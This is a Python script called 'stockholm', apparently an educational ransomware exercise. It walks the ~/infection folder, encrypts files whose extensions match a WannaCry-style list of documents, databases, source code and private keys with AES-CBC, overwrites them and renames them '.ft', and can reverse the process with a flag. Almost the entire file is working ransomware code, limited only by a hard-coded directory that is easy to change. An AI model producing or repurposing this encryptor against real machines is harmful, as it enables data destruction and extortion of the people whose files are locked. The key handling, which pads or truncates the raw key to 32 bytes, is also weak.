#!/usr/bin/env python3
import sys
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

TARGET_EXTENSIONS = {
	".doc", ".docx", ".xls", ".xlsx",
	".ppt", ".pptx", ".pdf", ".txt",
	".jpg", ".jpeg", ".png", ".gif", ".bmp",
	".zip", ".rar", ".7z", ".gz", ".tar", ".bak",
	".sql", ".sqlite3", ".db", ".mdb", ".accdb",
	".php", ".html", ".js", ".css",
	".c", ".cpp", ".h", ".cs", ".java", ".py",
	".sh", ".rb", ".pl",
	".mp3", ".wav", ".mp4", ".avi", ".mkv",
	".psd", ".tiff", ".raw",
	".pem", ".key", ".crt", ".pfx", ".csr"
}

key = None
reverse_mode = False
silent_mode = False
VERSION = "stockholm v1.0"

args = sys.argv[1:]

def encrypt_data(data, key):
	# Generate random IV (16 bytes for AES)
	iv = os.urandom(16)
	
	# Pad key to 32 bytes (AES-256)
	key_bytes = key.ljust(32)[:32]
	
	# Pad data to block size
	padder = padding.PKCS7(128).padder()
	padded_data = padder.update(data) + padder.finalize()
	
	# Encrypt
	cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
	encryptor = cipher.encryptor()
	encrypted = encryptor.update(padded_data) + encryptor.finalize()
	
	# Return IV + encrypted data
	return iv + encrypted

def decrypt_data(data, key):
	# Extract IV (first 16 bytes)
	iv = data[:16]
	encrypted = data[16:]
	
	# Pad key to 32 bytes (AES-256)
	key_bytes = key.ljust(32)[:32]
	
	# Decrypt
	cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
	decryptor = cipher.decryptor()
	decrypted_padded = decryptor.update(encrypted) + decryptor.finalize()
	
	# Unpad
	unpadder = padding.PKCS7(128).unpadder()
	decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
	
	return decrypted

def encrypt_file(path):
	try:
		with open(path, "rb") as f:
			data = f.read()
	except:
		print("Error: reading ", path)
		return
	
	encrypted = encrypt_data(data, key)

	try:
		with open(path, "wb") as f:
			f.write(encrypted)
	except:
		print("Error: saving ", path)
		return
	
	os.rename(path, path + ".ft")

def decrypt_file(path):
	try:
		with open(path, "rb") as f:
			data = f.read()
	except:
		print("Error: reading ", path)
		return
	
	decrypted = decrypt_data(data, key)

	try:
		with open(path, "wb") as f:
			f.write(decrypted)
	except:
		print("Error: saving ", path)
		return

	os.rename(path, path[:-3])


if not args:
	print("Error: missing key")
	sys.exit(1)

if "-h" in args or "-help" in args:
	print("Usage: ./stockholm [-r] [-s] <key>")
	sys.exit(0)

if "-v" in args or "-version" in args:
	print(VERSION)
	sys.exit(0)

if "-r" in args or "-reverse" in args:
	reverse_mode = True
	if "-r" in args:
		args.remove("-r")
	else:
		args.remove("-reverse")

if "-s" in args or "-silent" in args:
	silent_mode = True
	if "-s" in args:
		args.remove("-s")
	else:
		args.remove("-silent")

if len(args) != 1:
	print("Error: invalid arguments")
	sys.exit(1)

if len(args[0]) < 16:
	print("Error: key must be at least 16 characters long")
	sys.exit()

key = args[0].encode()

# target_dir = os.getenv("HOME") + "/infection/"
target_dir = os.path.join(os.path.expanduser("~"), "infection")

if not os.path.isdir(target_dir):
	print("Error: target directory ~/infection does not exists")
	sys.exit(1)
dir = os.listdir(target_dir)

for file in dir:
	full_path = os.path.join(target_dir, file)

	if not os.path.isfile(full_path):
		continue

	if reverse_mode:
		if file.endswith(".ft"):
			if not silent_mode:
				print(f"[+] decrypt: {file}")
			decrypt_file(full_path)
		else:
			if not silent_mode:
				print(f"[-] skipped: {file}")
	else:
		if file.endswith(".ft"):
			if not silent_mode:
				print(f"[-] skipped: {file}")
			continue

		ext = os.path.splitext(file)[1]

		if ext in TARGET_EXTENSIONS:
			if not silent_mode:
				print(f"[+] encrypt: {file}")
			encrypt_file(full_path)
		else:
			if not silent_mode:
				print(f"[-] skipped not WannaCry: {file}")

